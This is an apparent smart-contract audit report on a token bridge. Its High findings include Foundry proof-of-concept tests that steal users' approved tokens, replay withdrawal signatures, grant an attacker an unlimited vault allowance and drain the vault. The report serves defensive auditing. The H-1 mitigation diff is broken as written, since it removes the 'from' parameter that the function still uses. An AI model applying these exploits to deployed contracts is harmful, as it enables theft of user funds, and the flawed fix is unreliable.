## High

### [H-1] Arbitrary `from` parameter in `L1TokenBridge::depositTokensToL2` allows an attacker to mint infinite tokens and steal funds of users that approved the protocol. 

**Description:** `depositTokensToL2` function does not check the `from` parameter, allowing malicious users to steal other user's funds, if they have given token approval to `L1BossBridge` contract. As a matter of fact the `L1Vault.sol` approves the `L1BossBridge`:
```js
    constructor(IERC20 _token) Ownable(msg.sender) {
        token = _token;
        vault = new L1Vault(token);
        // Allows the bridge to move tokens out of the vault to facilitate withdrawals
        vault.approveTo(address(this), type(uint256).max);
    }
```
Moreover, an attacker could call `depositTokensToL2` with the vault address as both `from` and `to` parameters. This would allow the attacker to trigger the Deposit event any number of times, presumably causing the minting of unbacked tokens in L2.

**Impact:** 
1. User's funds could be stolen
2. Possible infinite minting

**Proof of Concept:**
First attack:
1. User gives token approval to `L1BossBridge`
2. Attacker notices it and calls `L1TokenBridge::depositTokensToL2` with user's address as `from` parameter to steal funds 

Second attack:
1. Attacker can trigger `Deposit` event by calling `L1TokenBridge::depositTokensToL2` with vault's addresses as `from` and `to`

PoC: Add following tests to the test suite:

```js
    function testArbitraryFrom() public {
        // 1. User approves the bridge
        vm.prank(user);
        token.approve(address(tokenBridge), type(uint256).max);

        // 2.
        uint256 depositAmount = token.balanceOf(user);
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, attacker, depositAmount);
        tokenBridge.depositTokensToL2(user, attacker, depositAmount);

        assertEq(token.balanceOf(user), 0);
        assertEq(token.balanceOf(address(vault)), depositAmount);
        vm.stopPrank();
    }

    function testInfiniteMint() public {
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);

        uint256 vaultBalance = 500 ether;
        deal(address(token), address(vault), vaultBalance);

        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), address(vault), vaultBalance);
        tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);

        // Any number of times
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), address(vault), vaultBalance);
        tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);

        vm.stopPrank();
    }
```

**Recommended Mitigation:** Consider add following modifications to the function:
```diff
-   function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+   function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
        token.safeTransferFrom(from, address(vault), amount);

        // Our off-chain service picks up this event and mints the corresponding tokens on L2
-       emit Deposit(from, l2Recipient, amount);
+       emit Deposit(msg.sender, l2Recipient, amount);
    }
```

### [H-2] Lacking replay protection in `L1BossBridge::withdrawTokensToL1` allows to drain the protocol funds by replaying the signature.

**Description:** In order to be able to withdraw tokens from L2 to L1, a user needs a valid signature from the `Signer`. As no signature replay countermeasures are implemented, replay attack is possible.

**Impact:** Attacker can drain the protocol funds.

**Proof of Concept:**

1. Attacker needs to deposit some initial balance to L2
2. Then he withdraws the money, a Signer signs the withdrawal
3. Attacker replays the transaction

PoC:

```js
    function testSignatureReplay() public {
        address attacker = makeAddr("attacker");
        uint256 vaultInitialBalance = 1000e18;
        uint256 attackerInitialBalance = 100e18;
        deal(address(token), address(vault), vaultInitialBalance);
        deal(address(token), attacker, attackerInitialBalance);

        vm.startPrank(attacker);
        token.approve(address(tokenBridge), type(uint256).max);
        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);

        // Signer/Operator is going to sign the withdrawal
        bytes memory message = abi.encode(
            address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBalance))
        );
        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
        while (token.balanceOf(address(vault)) > 0) {
            tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
        }

        assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance);
        assertEq(token.balanceOf(address(vault)), 0);
    }
```

**Recommended Mitigation:** 
Sign messages with nonce and address of the contract. [Example](https://solidity-by-example.org/hacks/signature-replay/)

### [H-3] Arbitrary calls in `L1BossBridge::sendToL1` enables an attacker to call `L1Vault::approveTo` and receive infinite allowance of vault funds

**Description:** 
The `L1BossBridge` contract contains the `sendToL1` function, which can execute arbitrary low-level calls to any specified target if invoked with a valid operator signature. Since there are no restrictions on the target or the calldata, this function could be exploited by an attacker to interact with sensitive contracts connected to the bridge, such as the `L1Vault` contract. Notably, the `L1BossBridge` has ownership of the `L1Vault`. An attacker could craft a call targeting the vault to invoke its `approveTo` function, supplying an attacker-controlled address to increase its allowance. This would grant the attacker the ability to fully drain the vault’s funds.

**Impact:** 
Vault could be drained.

**Proof of Concept:**
Add the following test to the test suite:

```js
    function testInfiniteAllowance() public {
        address attacker = makeAddr("attacker");
        uint256 vaultInitialBalance = 1000e18;
        deal(address(token), address(vault), vaultInitialBalance);

        // An attacker deposits tokens to L2. We do this under the assumption that the
        // bridge operator needs to see a valid deposit tx to then allow us to request a withdrawal.
        vm.startPrank(attacker);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(attacker), address(0), 0);
        tokenBridge.depositTokensToL2(attacker, address(0), 0);

        // Under the assumption that the bridge operator doesn't validate bytes being signed
        bytes memory message = abi.encode(
            address(vault), // target
            0, // value
            abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max)) // data
        );
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);

        tokenBridge.sendToL1(v, r, s, message);
        assertEq(token.allowance(address(vault), attacker), type(uint256).max);
        token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
    }
```
**Recommended Mitigation:** 
Consider disallowing attacker-controlled external calls to sensitive components of the bridge, such as the L1Vault contract.

### [H-4] `L1BossBridge::withdrawTokensToL1` does not validate the withdrawal amount allowing attacker to withdraw more funds than deposited

**Description:** `withdrawTokensToL1` function does not check if the withdrawal amount exceeds the amount of deposited funds. If a `Signer` doesn't check the amounts manually and only validates the fact that a user has deposited to L2, it is possible for the attacker to withdraw more than he deposited.

**Impact:** 
Attacker can actually steal all the tokens in vault.

**Proof of Concept:**
Add following test to the test suite:
```js
    function testArbitraryWithdrawAmount() public {
        address attacker = makeAddr("attacker");
        uint256 attackerInitialBalance = 1e18;
        uint256 vaultInitialBalance = 1000e18;
        deal(address(token), address(vault), vaultInitialBalance);
        deal(address(token), attacker, attackerInitialBalance);

        vm.startPrank(attacker);
        token.approve(address(tokenBridge), type(uint256).max);
        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);

        // Signer/Operator is going to sign the withdrawal
        bytes memory message = abi.encode(
            address(token),
            0,
            abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, token.balanceOf(address(vault))))
        );
        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
        tokenBridge.withdrawTokensToL1(attacker, token.balanceOf(address(vault)), v, r, s);
        console2.log("New attacker balance on L1: ", token.balanceOf(address(attacker)));
        assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance);
        assertEq(token.balanceOf(address(vault)), 0);
        vm.stopPrank();
    }
```

**Recommended Mitigation:** 
Consider adding withdrawal amount checks.

## Medium

### [M-1] `create` opcode does not work on zksync era

**Description:** 
zkSync docs say: 


"There is a lot of confusion amongst the community with regard to the impacts of being EVM Compatible versus EVM Equivalent. First, let’s define what is meant by the two.

- EVM Equivalent means that a given protocol supports every opcode of Ethereum’s EVM down to the bytecode. Thus, any EVM smart contract works with 100% assurance out of the box.
- EVM Compatible means that a percentage of the opcodes of Ethereum’s EVM are supported; thus, a percentage of smart contracts work out of the box.

zkSync is optimized to be EVM compatible not EVM equivalent ...".
On ZKsync Era, contract deployment is performed using the hash of the bytecode, and the factoryDeps field of EIP712 transactions contains the bytecode. The actual deployment occurs by providing the contract's hash to the ContractDeployer system contract.
To guarantee that create/create2 functions operate correctly, the compiler must be aware of the bytecode of the deployed contract in advance. (https://docs.zksync.io/zksync-protocol/differences/evm-instructions)
The following codesnippet would not work on zksync correctly because the compiler is not aware of the bytecode beforehand:
```js
    function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
        assembly {
            addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
        }
        s_tokenToAddress[symbol] = addr;
        emit TokenDeployed(symbol, addr);
    }
```

**Impact:** 
Protocol may function incorrectly on zksync

**Recommended Mitigation:** 
Check the zksync docks and implement another contract version for zksync with a `CREATE2` function.

### [M-2] Possible gas bomb in `L1BossBridge::sendToL1` due to unchecked message data

**Description:** 
During withdrawals, the L1 part of the bridge executes a low-level call to an arbitrary target passing all available gas. While this would work fine for regular targets, it may not for adversarial ones. A gas bomb it's a circumstance where an unexpectedly large amount of gas is suddenly required to execute the function of a protocol. This would be done by returning large amount of return data in the call, which Solidity would copy to memory, thus increasing gas costs due to the expensive memory operations.

**Impact:** 
A caller will spend much more money to execute the call.

**Recommended Mitigation:** 
If the external call's returndata is not to be used, then consider modifying the call to avoid copying any of the data. This can be done in a custom implementation, or reusing external libraries such as [this one](https://github.com/nomad-xyz/ExcessivelySafeCall).

## Low

### L-1: Unsafe ERC20 Operations should not be used

ERC20 functions may not behave as expected. For example: return values are not always meaningful. It is recommended to use OpenZeppelin's SafeERC20 library.

<details><summary>2 Found Instances</summary>


- Found in src/L1BossBridge.sol [Line: 99](src/L1BossBridge.sol#L99)

	```solidity
	                abi.encodeCall(IERC20.transferFrom, (address(vault), to, amount))
	```

- Found in src/L1Vault.sol [Line: 20](src/L1Vault.sol#L20)

	```solidity
	        token.approve(target, amount);
	```

</details>

## L-2: PUSH0 is not supported by all chains

Solc compiler version 0.8.20 switches the default target EVM version to Shanghai, which means that the generated bytecode will include PUSH0 opcodes. Be sure to select the appropriate EVM version in case you intend to deploy on a chain other than mainnet like L2 chains that may not support PUSH0, otherwise deployment of your contracts will fail.

<details><summary>4 Found Instances</summary>


- Found in src/L1BossBridge.sol [Line: 15](src/L1BossBridge.sol#L15)

	```solidity
	pragma solidity 0.8.20;
	```

- Found in src/L1Token.sol [Line: 2](src/L1Token.sol#L2)

	```solidity
	pragma solidity 0.8.20;
	```

- Found in src/L1Vault.sol [Line: 2](src/L1Vault.sol#L2)

	```solidity
	pragma solidity 0.8.20;
	```

- Found in src/TokenFactory.sol [Line: 2](src/TokenFactory.sol#L2)

	```solidity
	pragma solidity 0.8.20;
	```

</details>

### L-3: Lack of event emission during withdrawals and sending tokesn to L1

Neither the sendToL1 function nor the withdrawTokensToL1 function emit an event when a withdrawal operation is successfully executed. This prevents off-chain monitoring mechanisms to monitor withdrawals and raise alerts on suspicious scenarios.

Modify the sendToL1 function to include a new event that is always emitted upon completing withdrawals.

## Gas

## G-1: `public` functions not used internally could be marked `external`

Instead of marking a function as `public`, consider marking it as `external` if it is not used internally.

<details><summary>2 Found Instances</summary>


- Found in src/TokenFactory.sol [Line: 23](src/TokenFactory.sol#L23)

	```solidity
	    function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
	```

- Found in src/TokenFactory.sol [Line: 31](src/TokenFactory.sol#L31)

	```solidity
	    function getTokenAddressFromSymbol(string memory symbol) public view returns (address addr) {
	```

</details>

